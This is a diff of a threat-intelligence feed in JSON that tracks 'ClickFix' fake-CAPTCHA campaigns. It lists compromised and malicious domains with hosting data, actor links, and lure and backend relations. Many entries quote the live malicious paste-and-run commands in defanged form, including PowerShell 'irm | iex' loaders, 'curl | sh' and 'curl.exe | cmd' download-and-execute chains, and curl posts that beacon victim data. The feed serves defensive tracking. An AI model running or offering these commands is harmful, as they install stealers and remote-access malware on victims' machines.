@@ -5,7 +5,7 @@
   "short": "Fake checks that get victims to paste and run a command",
   "summary": "A fake CAPTCHA, browser update or error message, usually injected into a hacked legitimate website, copies a command to the clipboard and tells the victim to paste it into the Run dialog, a terminal or PowerShell. The command downloads and runs malware, typically an information stealer or a remote-access tool. Some campaigns fetch their next stage from a public blockchain so the hacked site never has to change."
  },
- "count": 6321,
+ "count": 6310,
  "indicators": [
   {
    "indicator": "06services.it",
@@ -643,16 +643,19 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=8667619d-812d-4869-b52f-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Ffullkitchen.cn%2F&os=Mac%2015&lastVisitAt=2026-11-21T02%3A20%3A49.877Z&lastShellAt=2026-11-21T02%3A20%3A49.877Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=cd6003f7-d50b-4001-b9cb-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Ffullkitchen.cn%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-21T02%3A16%3A43.474Z\"\" -d \"\"lastShellAt=2026-11-21T02%3A16%3A43.474Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\"\" & curl.exe -fsSL \"\"hxxps[:]//softify[.]lat/w/8ecec3ba\"\" | powershell\""
+    "curl -sL -d \"id=7645f58b-f1f1-4bfb-ad24-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Ffullkitchen.cn%2F&os=Mac%2015&lastVisitAt=2026-11-28T00%3A04%3A04.719Z&lastShellAt=2026-11-28T00%3A04%3A04.719Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\" && curl -fsSL \"hxxps[:]//softify[.]lat/u/8ecec3ba\" | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=8bf708fe-2664-4567-a81f-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Ffullkitchen.cn%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-27T23%3A55%3A36.509Z\"\" -d \"\"lastShellAt=2026-11-27T23%3A55%3A36.509Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbwR4W_Fm4dL82LZC49P_G58-W06_Z_TMez_MEHLaklDe_nTe5wlqlWBsD02XGR-KYIX3A/exec\"\" & curl.exe -fsSL \"\"hxxps[:]//softify[.]lat/w/8ecec3ba\"\" | powershell\""
    ],
    "connects_to": [
     "softify.lat",
     "fingerprint-veri.info"
    ],
    "lure_from": [
+    "api.ipquery.io",
+    "tdssecure.beer",
     "browse-cloud.codes",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -1079,7 +1082,8 @@
     "codes.caffe-img.com",
     "codes.browse-cdn.beer",
     "browse-nnccodes.beer",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -4141,9 +4145,10 @@
    "lure_from": [
     "mon-blanc-02.cfd",
     "thu-ipad-03.cfd",
+    "interseq.at",
     "biboiboboorl.org",
     "yellow-monkey.cfd",
-    "interseq.at"
+    "barabulkaaaa.org"
    ]
   },
   {
@@ -7285,7 +7290,8 @@
     "codes.caffe-img.com",
     "codes.browse-cdn.beer",
     "browse-nnccodes.beer",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -8859,9 +8865,10 @@
    "lure_from": [
     "mon-blanc-02.cfd",
     "thu-ipad-03.cfd",
+    "interseq.at",
     "biboiboboorl.org",
     "yellow-monkey.cfd",
-    "interseq.at"
+    "barabulkaaaa.org"
    ]
   },
   {
@@ -12583,11 +12590,11 @@
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
-    "hagosuro.lc",
     "lepafonso.bz",
+    "hagosuro.lc",
+    "j7tracker.gb.net",
     "github.pw",
     "trustchecknes.com",
-    "j7tracker.gb.net",
     "t-trustresnew.com"
    ],
    "lure_from": [
@@ -15015,7 +15022,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-28",
-   "last_seen": "2026-10-28",
+   "last_seen": "2026-11-27",
    "last_online": "2026-11-27",
    "offline_since": null,
    "url": "https://www.aedsistemi.it/",
@@ -15033,7 +15040,7 @@
      "asn": "AS31034",
      "org": "ARUBA-ASN Aruba S.p.A., IT",
      "first_seen": "2026-10-28",
-     "last_seen": "2026-10-28"
+     "last_seen": "2026-11-27"
     }
    ],
    "hosts": [
@@ -15041,7 +15048,7 @@
      "host": "www.aedsistemi.it",
      "status": "online",
      "first_seen": "2026-10-28",
-     "last_seen": "2026-10-28"
+     "last_seen": "2026-11-27"
     }
    ],
    "actor": null,
@@ -22280,67 +22287,6 @@
     "fcdnbovres.cc",
     "webrtwtre22.cc",
     "webffoo002.cc"
-   ]
-  },
-  {
-   "indicator": "altin-steakhouse.ch",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-11-08",
-   "last_seen": "2026-11-19",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://aarburg.altin-steakhouse.ch/",
-   "brand": null,
-   "product": null,
-   "hosting": "CYON cyon AG",
-   "dns": "cyon.ch",
-   "ip": "2a01:ab20:0:4::60",
-   "asn": "AS47302",
-   "org": "CYON cyon AG, CH",
-   "country": "CH",
-   "ips": [
-    {
-     "ip": "2a01:ab20:0:4::60",
-     "asn": "AS47302",
-     "org": "CYON cyon AG, CH",
-     "first_seen": "2026-11-18",
-     "last_seen": "2026-11-19"
-    },
-    {
-     "ip": "149.126.4.60",
-     "asn": "AS47302",
-     "org": "CYON cyon AG, CH",
-     "first_seen": "2026-11-08",
-     "last_seen": "2026-11-15"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "aarburg.altin-steakhouse.ch",
-     "status": "online",
-     "first_seen": "2026-11-08",
-     "last_seen": "2026-11-19"
-    }
-   ],
-   "actor": "dprk",
-   "actor_link": "linked",
-   "commands": [
-    "curl -sL -d \"id=98002612-e8a1-4971-a708-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Faarburg.altin-steakhouse.ch%2F&os=Mac%2015&lastVisitAt=2026-11-15T16%3A42%3A02.344Z&lastShellAt=2026-11-15T16%3A42%3A02.344Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
-    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=ea72ca28-e72b-4bb2-a397-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Faarburg.altin-steakhouse.ch%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-15T16%3A34%3A07.969Z\"\" -d \"\"lastShellAt=2026-11-15T16%3A34%3A07.969Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
-   ],
-   "connects_to": [
-    "fingerprint-veri.info",
-    "softify.lat"
-   ],
-   "lure_from": [
-    "codes.browse-cdn.beer",
-    "browse-cloud.codes"
    ]
   },
   {
@@ -47215,23 +47161,23 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "172.67.217.177",
+   "ip": "104.21.70.12",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "172.67.217.177",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-27",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "104.21.70.12",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-25",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "172.67.217.177",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-27",
      "last_seen": "2026-11-27"
     },
     {
@@ -51247,8 +51193,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=e8219d12-d1d9-4368-adfc-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fdev.wordpress.blackbirdtech.app%2F&os=Mac%2015&lastVisitAt=2026-11-21T03%3A26%3A40.705Z&lastShellAt=2026-11-21T03%3A26%3A40.705Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=b2e247ca-dec2-486a-9e21-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fdev.wordpress.blackbirdtech.app%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-21T03%3A21%3A56.369Z\"\" -d \"\"lastShellAt=2026-11-21T03%3A21%3A56.369Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=178b6776-01f5-4b8f-b248-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fdev.wordpress.blackbirdtech.app%2F&os=Mac%2015&lastVisitAt=2026-11-28T00%3A04%3A36.138Z&lastShellAt=2026-11-28T00%3A04%3A36.138Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=e7295b57-34fe-4b91-b002-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fdev.wordpress.blackbirdtech.app%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-27T23%3A56%3A00.163Z\"\" -d \"\"lastShellAt=2026-11-27T23%3A56%3A00.163Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info",
@@ -51257,6 +51203,7 @@
    "lure_from": [
     "browse-cloud.codes",
     "img-codes-cloude.info",
+    "browse-login.info",
     "ncheck-brows.beer",
     "codes.browse-cdn.beer",
     "browse-nnccodes.beer"
@@ -58164,68 +58111,6 @@
    ]
   },
   {
-   "indicator": "btltrimsaccessories.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Redirector",
-   "status": "online",
-   "first_seen": "2026-10-21",
-   "last_seen": "2026-11-09",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://btltrimsaccessories.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "Namecheap",
-   "dns": "Spaceship",
-   "ip": "209.74.68.17",
-   "asn": "AS22612",
-   "org": "NAMECHEAP-NET - Namecheap, Inc., US",
-   "country": "SG",
-   "ips": [
-    {
-     "ip": "209.74.68.17",
-     "asn": "AS22612",
-     "org": "NAMECHEAP-NET - Namecheap, Inc., US",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-11-09"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "btltrimsaccessories.com",
-     "status": "online",
-     "first_seen": "2026-10-21",
-     "last_seen": "2026-11-09"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "(irm 'hxxp[:]//hagosuro[.]lc/dantestraff18/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'})|iex",
-    "(irm 'hxxps[:]//t-trustrest[.]com/proliv2929/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/proliv2929' >/dev/null"
-   ],
-   "connects_to": [
-    "xorados.com",
-    "t-trustrest.com",
-    "hagosuro.lc",
-    "groverudder12.com",
-    "trek-72.com",
-    "trustchecknes.com",
-    "ncheck-brows.beer",
-    "id-verfied.boats"
-   ],
-   "lure_from": [
-    "interseq.at",
-    "jscdncloude.beer",
-    "codes.caffe-img.com",
-    "codes.browse-cdn.beer"
-   ]
-  },
-  {
    "indicator": "btservicesprosllc.com",
    "type": "domain",
    "category": "clickfix",
@@ -60917,8 +60802,8 @@
    ],
    "lure_from": [
     "fudcomcheck.art",
-    "verifyidentrob01.cc",
     "fcdnbovres.cc",
+    "verifyidentrob01.cc",
     "govrobczxc.cc"
    ]
   },
@@ -62912,62 +62797,6 @@
    "lure_from": []
   },
   {
-   "indicator": "canwashers.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-30",
-   "last_seen": "2026-10-31",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://canwashers.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "GoDaddy",
-   "dns": "AWS Route 53",
-   "ip": "45.40.154.139",
-   "asn": "AS398787",
-   "org": "GO-DADDY-COM-LLC - GoDaddy.com, LLC, US",
-   "country": "US",
-   "ips": [
-    {
-     "ip": "45.40.154.139",
-     "asn": "AS398787",
-     "org": "GO-DADDY-COM-LLC - GoDaddy.com, LLC, US",
-     "first_seen": "2026-10-30",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "canwashers.com",
-     "status": "online",
-     "first_seen": "2026-10-30",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm hxxps[:]//fudcomcheck[.]art/cdn/sync/traffic?r=8eb6|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//fudcomcheck[.]art/cdn/sync/traffic?r=8eb6|iex</span>",
-    "irm hxxps[:]//checkogosdfg33[.]cc/cdn/sync/traffic?r=56ce|iex"
-   ],
-   "connects_to": [
-    "ubbrobccheck20.cc",
-    "fudcomcheck.art",
-    "checkogosdfg33.cc",
-    "verifyidentrob01.cc"
-   ],
-   "lure_from": [
-    "fcdnbovres.cc",
-    "govrobczxc.cc"
-   ]
-  },
-  {
    "indicator": "capacitacionespracticas.com",
    "type": "domain",
    "category": "clickfix",
@@ -64390,10 +64219,10 @@
     "verifyidentrob01.cc"
    ],
    "lure_from": [
-    "govrobczxc.cc",
-    "fudcomcheck.art",
     "tthcsslread21.cc",
     "tlschssl22read.cc",
+    "govrobczxc.cc",
+    "fudcomcheck.art",
     "fcdnbovres.cc",
     "webrtwtre22.cc",
     "webffoo002.cc"
@@ -65659,62 +65488,6 @@
    ]
   },
   {
-   "indicator": "casinoarabic.org",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-10-30",
-   "last_seen": "2026-10-31",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://casinoarabic.org/",
-   "brand": null,
-   "product": null,
-   "hosting": "Cloudflare (proxied)",
-   "dns": "Cloudflare",
-   "ip": "172.67.156.108",
-   "asn": "AS13335",
-   "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-   "country": null,
-   "ips": [
-    {
-     "ip": "172.67.156.108",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-10-30",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "casinoarabic.org",
-     "status": "online",
-     "first_seen": "2026-10-30",
-     "last_seen": "2026-10-31"
-    }
-   ],
-   "actor": null,
-   "actor_link": null,
-   "commands": [
-    "irm hxxps[:]//fudcomcheck[.]art/cdn/sync/traffic?r=1bab|iex",
-    "<span style=\"white-space:pre\">irm hxxps[:]//fudcomcheck[.]art/cdn/sync/traffic?r=1bab|iex</span>",
-    "irm hxxps[:]//ubbrobccheck20[.]cc/cdn/sync/traffic?r=376b|iex"
-   ],
-   "connects_to": [
-    "ubbrobccheck20.cc",
-    "fudcomcheck.art"
-   ],
-   "lure_from": [
-    "verifyidentrob01.cc",
-    "fcdnbovres.cc",
-    "checkogosdfg33.cc",
-    "govrobczxc.cc"
-   ]
-  },
-  {
    "indicator": "casinoblitzzone.com",
    "type": "domain",
    "category": "clickfix",
@@ -66425,9 +66198,9 @@
    ],
    "lure_from": [
     "verifyidentrob01.cc",
-    "fudcomcheck.art",
     "tthcsslread21.cc",
     "tlschssl22read.cc",
+    "fudcomcheck.art",
     "fcdnbovres.cc",
     "webrtwtre22.cc"
    ]
@@ -67894,7 +67667,8 @@
    ],
    "lure_from": [
     "codes.browse-cdn.beer",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -74254,7 +74028,8 @@
     "browse-cloud.codes"
    ],
    "lure_from": [
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -88294,61 +88069,6 @@
    "lure_from": []
   },
   {
-   "indicator": "danabagroup.com",
-   "type": "domain",
-   "category": "clickfix",
-   "backend_for": null,
-   "campaign": null,
-   "role": "Phishing page",
-   "status": "online",
-   "first_seen": "2026-11-15",
-   "last_seen": "2026-11-17",
-   "last_online": "2026-11-27",
-   "offline_since": null,
-   "url": "https://www.danabagroup.com/",
-   "brand": null,
-   "product": null,
-   "hosting": "ONECOM One.com A/S",
-   "dns": "one.com",
-   "ip": "2a02:2350:5:10c:802d:f17a:97f2:5911",
-   "asn": "AS51468",
-   "org": "ONECOM One.com A/S, DK",
-   "country": "DK",
-   "ips": [
-    {
-     "ip": "2a02:2350:5:10c:802d:f17a:97f2:5911",
-     "asn": "AS51468",
-     "org": "ONECOM One.com A/S, DK",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-17"
-    }
-   ],
-   "hosts": [
-    {
-     "host": "www.danabagroup.com",
-     "status": "online",
-     "first_seen": "2026-11-15",
-     "last_seen": "2026-11-17"
-    }
-   ],
-   "actor": "dprk",
-   "actor_link": "linked",
-   "commands": [
-    "curl -sL -d \"id=c193fe57-5892-4638-a053-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=https%3A%2F%2Fwww.danabagroup.com%2F&os=Mac%2015&lastVisitAt=2026-11-15T19%3A59%3A55.719Z&lastShellAt=2026-11-15T19%3A59%3A55.719Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
-    "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=1702eb0e-7d6a-4fbe-924b-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=https%3A%2F%2Fwww.danabagroup.com%2F\"\" -d \"\"os=win11\"\" -d \"\"lastVisitAt=2026-11-15T19%3A46%3A54.193Z\"\" -d \"\"lastShellAt=2026-11-15T19%3A46%3A54.193Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
-   ],
-   "connects_to": [
-    "fingerprint-veri.info"
-   ],
-   "lure_from": [
-    "browse-cloud.codes",
-    "analyticroutebox.com",
-    "eventwireix.com",
-    "metricserveonline.com"
-   ]
-  },
-  {
    "indicator": "danapharmacy.com",
    "type": "domain",
    "category": "clickfix",
@@ -98199,8 +97919,8 @@
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
-    "ncheck-brows.beer",
     "j7tracker.gb.net",
+    "ncheck-brows.beer",
     "github.pw",
     "t-trustresnew.com",
     "trustchecknes.com"
@@ -99723,13 +99443,13 @@
    "actor": "dprk",
    "actor_link": "linked",
    "commands": [
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex",
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh",
-    "curl.exe -s hxxps[:]//script-six-tawny[.]vercel[.]app/win -L | cmd"
+    "curl -s 'hxxps[:]//script-six-tawny[.]vercel[.]app/mac' -L | sh"
    ],
    "connects_to": [
-    "fingerprint-veri.info",
     "j7tracker.gb.net",
+    "fingerprint-veri.info",
     "holodeo.net"
    ],
    "lure_from": [
@@ -107331,6 +107051,7 @@
     "browse-cloud.codes"
    ],
    "lure_from": [
+    "browse-login.info",
     "img-codes-cloude.info"
    ]
   },
@@ -108158,8 +107879,8 @@
    "actor_link": "linked",
    "commands": [
     "powershell -w h \"iex(irm 'fingerprint-veri[.]info/[id]'); Start-Sleep -Seconds 30\"; exit",
-    "curl -sL -d \"id=58bc7b76-37ca-4868-b417-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=http%3A%2F%2Fwww.elksportswear.in%2F&os=Mac%2010.15&lastVisitAt=2026-11-21T02%3A20%3A40.412Z&lastShellAt=2026-11-21T02%3A20%3A40.412Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
-    "cmd.exe /c \"curl.exe -sL -d \"\"id=b4d499a7-9692-4eaf-b14b-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=http%3A%2F%2Fwww.elksportswear.in%2F\"\" -d \"\"os=win10\"\" -d \"\"lastVisitAt=2026-11-21T02%3A16%3A24.005Z\"\" -d \"\"lastShellAt=2026-11-21T02%3A16%3A24.005Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
+    "curl -sL -d \"id=7443d581-993b-4f33-bb8f-[id]&location=America%2FNew_York%20%7C%20en-US&siteUrl=http%3A%2F%2Fwww.elksportswear.in%2F&os=Mac%2010.15&lastVisitAt=2026-11-28T00%3A03%3A36.896Z&lastShellAt=2026-11-28T00%3A03%3A36.896Z\" \"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\" && curl -s 'hxxps[:]//claude-flare-verification[.]vercel[.]app/mac' -L | sh",
+    "cmd.exe /c \"curl.exe -sL -d \"\"id=92544502-c485-4cd8-aad6-[id]\"\" -d \"\"location=America%2FNew_York%20%7C%20en-US\"\" -d \"\"siteUrl=http%3A%2F%2Fwww.elksportswear.in%2F\"\" -d \"\"os=win10\"\" -d \"\"lastVisitAt=2026-11-27T23%3A55%3A05.410Z\"\" -d \"\"lastShellAt=2026-11-27T23%3A55%3A05.410Z\"\" \"\"hxxps[:]//script[.]google[.]com/macros/s/AKfycbzs0vQRvI-[encoded]\"\" & curl.exe -s hxxps[:]//claude-flare-verification[.]vercel[.]app/win -L | cmd\""
    ],
    "connects_to": [
     "fingerprint-veri.info"
@@ -108167,8 +107888,8 @@
    "lure_from": [
     "browse-cloud.codes",
     "img-codes-cloude.info",
-    "jjjducodes.beer",
-    "browse-login.info"
+    "browse-login.info",
+    "jjjducodes.beer"
    ]
   },
   {
@@ -110236,15 +109957,15 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh ; curl -fsS 'hxxps[:]//xorados[.]com/x/dan_proliv' >/dev/null",
     "(irm 'hxxps[:]//t-trustrest[.]com/dan_proliv/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/dan_proliv/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/prolivdante1/[id]')|iex"
    ],
    "connects_to": [
     "xorados.com",
     "trek-72.com",
     "t-trustrest.com",
     "t-trustresnew.com",
-    "trustchecknes.com",
     "j7tracker.gb.net",
+    "trustchecknes.com",
     "hagosuro.lc"
    ],
    "lure_from": [
@@ -119649,10 +119370,10 @@
     "yaebalciganovvjopu.org",
     "biboiboboorl.org",
     "yellow-monkey.cfd",
+    "barabulkaaaa.org",
     "ciganshina.org",
     "pakistanskimalchik.org",
-    "pizdalisibivet.org",
-    "yaponovosh.org"
+    "pizdalisibivet.org"
    ]
   },
   {
@@ -120719,7 +120440,8 @@
     "assetwaveapp.com",
     "bannerware.net",
     "trackbaseneo.net",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -133964,13 +133686,13 @@
    "commands": [
     "curl -s $(echo \"[encoded]\" | openssl base64 -d -A) | zsh",
     "(irm 'hxxps[:]//t-trustrest[.]com/ae8ouxb9gx/[id]' -UserAgent 'WUA/[id]' -Headers @{'X-WUA'='[id]'} -TimeoutSec 45)|iex",
-    "(irm 'hxxps[:]//t-trustresnew[.]com/ae8ouxb9gx/[id]')|iex"
+    "(irm 'hxxps[:]//j7tracker[.]gb[.]net/8pchkbdes5/[id]')|iex"
    ],
    "connects_to": [
     "trek-72.com",
     "t-trustrest.com",
-    "t-trustresnew.com",
     "j7tracker.gb.net",
+    "t-trustresnew.com",
     "trustchecknes.com"
    ],
    "lure_from": [
@@ -143671,7 +143393,7 @@
    "role": "Redirector",
    "status": "online",
    "first_seen": "2026-10-25",
-   "last_seen": "2026-10-25",
+   "last_seen": "2026-11-27",
    "last_online": "2026-11-27",
    "offline_since": null,
    "url": "https://hammerenter.com/",
@@ -143689,7 +143411,7 @@
      "asn": "AS46606",
      "org": "UNIFIEDLAYER-AS-1 - Unified Layer, US",
      "first_seen": "2026-10-25",
-     "last_seen": "2026-10-25"
+     "last_seen": "2026-11-27"
     }
    ],
    "hosts": [
@@ -143697,7 +143419,7 @@
      "host": "hammerenter.com",
      "status": "online",
      "first_seen": "2026-10-25",
-     "last_seen": "2026-10-25"
+     "last_seen": "2026-11-27"
     }
    ],
    "actor": null,
@@ -145966,7 +145688,8 @@
    "lure_from": [
     "ncheck-brows.beer",
     "codes.browse-cdn.beer",
-    "img-codes-cloude.info"
+    "img-codes-cloude.info",
+    "browse-login.info"
    ]
   },
   {
@@ -163704,23 +163427,23 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "2606:4700:3034::6815:981",
+   "ip": "104.21.9.129",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "2606:4700:3034::6815:981",
-     "asn": "AS13335",
-     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
-     "first_seen": "2026-11-25",
-     "last_seen": "2026-11-27"
-    },
-    {
      "ip": "104.21.9.129",
      "asn": "AS13335",
      "org": "CLOUDFLARENET - Cloudflare, Inc., US",
      "first_seen": "2026-11-26",
+     "last_seen": "2026-11-27"
+    },
+    {
+     "ip": "2606:4700:3034::6815:981",
+     "asn": "AS13335",
+     "org": "CLOUDFLARENET - Cloudflare, Inc., US",
+     "first_seen": "2026-11-25",
      "last_seen": "2026-11-27"
     },
     {
@@ -166710,8 +166433,8 @@
    ],
    "connects_to": [
     "xorados.com",
-    "t-trustrest.com",
     "hagosuro.lc",
+    "t-trustrest.com",
     "trek-72.com",
     "groverudder12.com",
     "trustchecknes.com",
@@ -181062,7 +180785,7 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "188.114.96.3",
+   "ip": "188.114.97.3",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
@@ -190424,23 +190147,23 @@
    "product": null,
    "hosting": "Cloudflare (proxied)",
    "dns": "Cloudflare",
-   "ip": "2606:4700:3032::ac43:b58e",
+   "ip": "172.67.181.142",
    "asn": "AS13335",
    "org": "CLOUDFLARENET - Cloudflare, Inc., US",
    "country": null,
    "ips": [
     {
-     "ip": "2606:4700:3032::ac43:b58e",
-     "asn": "AS13335",
